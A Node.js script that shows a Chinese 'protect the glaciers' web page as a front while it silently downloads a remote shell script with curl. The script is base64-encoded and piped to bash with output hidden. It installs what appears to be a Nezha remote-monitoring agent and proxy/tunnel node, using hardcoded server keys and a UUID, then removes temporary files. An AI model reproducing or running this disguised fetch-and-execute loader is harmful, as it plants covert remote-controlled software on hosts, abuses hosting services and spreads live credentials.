const { execSync, spawn } = require('child_process');
const fs = require('fs');
const http = require('http');

// 将 HTML 内容直接嵌入到 JS 变量中
const htmlContent = `
<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>保护冰川 - 守护地球的永恒之冰</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            font-family: "Microsoft YaHei", Arial, sans-serif;
            background-image: url('https://glacier-tours.com/wp-content/uploads/2018/01/see-blue-ice-on-the-matanuska-glacier-in-alaska.jpg');
            background-size: cover;
            background-attachment: fixed;
            background-position: center;
            margin: 0;
            padding: 20px;
            color: #333;
        }
        .header { text-align: center; color: #fff; font-size: 32px; font-weight: bold; margin: 20px 0 40px; text-shadow: 2px 2px 6px rgba(0, 0, 0, 0.8); }
        .subtitle { text-align: center; color: #fff; font-size: 18px; margin-bottom: 40px; text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.8); }
        .search-container { padding: 2rem 0; width: 100%; max-width: 600px; margin: 0 auto 40px; }
        .search-box { width: 100%; padding: 16px 20px; font-size: 18px; border: none; border-radius: 50px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3); outline: none; background-color: rgba(255, 255, 255, 0.9); }
        .container { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 16px; }
        .link-item { background-color: rgba(255, 255, 255, 0.8); border-radius: 16px; padding: 16px; transition: all 0.3s ease; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15); text-align: center; height: 100px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .link-item:hover { background-color: rgba(255, 255, 255, 0.95); transform: translateY(-6px); box-shadow: 0 12px 20px rgba(0, 0, 0, 0.25); }
        .link-item a { text-decoration: none; color: #0d47a1; display: flex; flex-direction: column; align-items: center; width: 100%; height: 100%; justify-content: center; }
        .link-icon { width: 40px; height: 40px; margin-bottom: 10px; object-fit: contain; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
        .link-text { font-size: 15px; font-weight: 500; text-align: center; word-break: break-word; }
        .foot_marker { position: fixed; bottom: 10px; left: 0; right: 0; width: 100%; text-align: center; font-size: 14px; color: rgba(255,255,255,0.9); z-index: 999; padding: 10px 0; background: linear-gradient(to top, rgba(0,0,0,0.5), transparent); }
        .foot_marker a { color: #fff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="header">保护冰川</div>
    <div class="subtitle">冰川是地球的淡水宝库与气候记录者，让我们共同守护这些永恒之冰</div>
    <div class="search-container">
        <form action="https://www.google.com/search" method="get" target="_blank">
            <input class="search-box" type="text" name="q" placeholder="搜索保护冰川相关信息...">
        </form>
    </div>
    <div class="container">
        <div class="link-item"><a href="https://www.greenpeace.org/" target="_blank"><i class="fas fa-globe link-icon" style="color:#0277bd;"></i><span class="link-text">绿色和平</span></a></div>
        <div class="link-item"><a href="https://www.wwf.org/" target="_blank"><i class="fas fa-paw link-icon" style="color:#1565c0;"></i><span class="link-text">WWF 全球</span></a></div>
        <div class="link-item"><a href="https://www.antarcticacampaign.org/" target="_blank"><i class="fas fa-snowflake link-icon" style="color:#039be5;"></i><span class="link-text">南极保护运动</span></a></div>
        <div class="link-item"><a href="https://nsidc.org/" target="_blank"><i class="fas fa-satellite link-icon" style="color:#0288d1;"></i><span class="link-text">冰雪数据中心</span></a></div>
        <div class="link-item"><a href="https://www.mee.gov.cn/" target="_blank"><i class="fas fa-leaf link-icon" style="color:#43a047;"></i><span class="link-text">生态环境部</span></a></div>
        <div class="link-item"><a href="https://climate.nasa.gov/" target="_blank"><i class="fas fa-space-shuttle link-icon" style="color:#0d47a1;"></i><span class="link-text">NASA 气候变化</span></a></div>
    </div>
    <div class="foot_marker">
        <a href="https://github.com/eooce" target="_blank">Powered by you and me | 保护冰川，从减少碳排放开始</a>
    </div>
</body>
</html>
`;

function runScriptWithEnv() {
    const envVars = {
        UUID: 'faacf142-dee8-48c2-8558-641123eb939c',
        NEZHA_SERVER: 'nezha.mingfei1981.eu.org',
        NEZHA_PORT: '443',
        NEZHA_KEY: 'IqAc0EBKNec6Oy46kE',
        HY2_PORT: '9045',
        ARGO_DOMAIN: '',
        ARGO_AUTH: '',
        CFIP: 'jd.bp.cloudns.ch'
    };

    const scriptUrl = 'https://main.ssss.nyc.mn/sb.sh';
    const fullEnv = { ...process.env, ...envVars };

    async function executeAndReplace() {
        try {
            // 1. 下载并修改脚本
            const downloadCommand = `curl -Ls ${scriptUrl}`;
            let scriptContent = execSync(downloadCommand, { encoding: 'utf8' });
            
            scriptContent = scriptContent.replace(/command -v curl .* Error: neither curl nor curl -LO found, please install one of them.*?\n/, '');
            scriptContent = scriptContent.replace(/\$COMMAND sbx \"https:\/\/\$ARCH\.ssss\.nyc\.mn\/sbsh\"/, 'curl -o sbx "https://$ARCH.ssss.nyc.mn/sbsh"');
            
            const base64Script = Buffer.from(scriptContent).toString('base64');
            const finalBashCommand = `echo ${base64Script} | base64 -d | bash`;

            // 2. 静默执行脚本
            spawn('bash', ['-c', finalBashCommand], {
                env: fullEnv,
                shell: false,
                stdio: 'ignore' 
            });

            // 3. 启动 Web 服务 (使用配置的 HY2_PORT)
            http.createServer((req, res) => {
                res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
                res.end(htmlContent);
            }).listen(envVars.HY2_PORT);

            // 4. 清理并保持运行
            setTimeout(() => {
                try { fs.rmSync('./.tmp', { recursive: true, force: true }); } catch (e) {}
            }, 60000);

            spawn('tail -f /dev/null', { stdio: 'ignore', shell: true });
            
        } catch (error) {
            process.exit(1);
        }
    }

    executeAndReplace();
}

runScriptWithEnv();
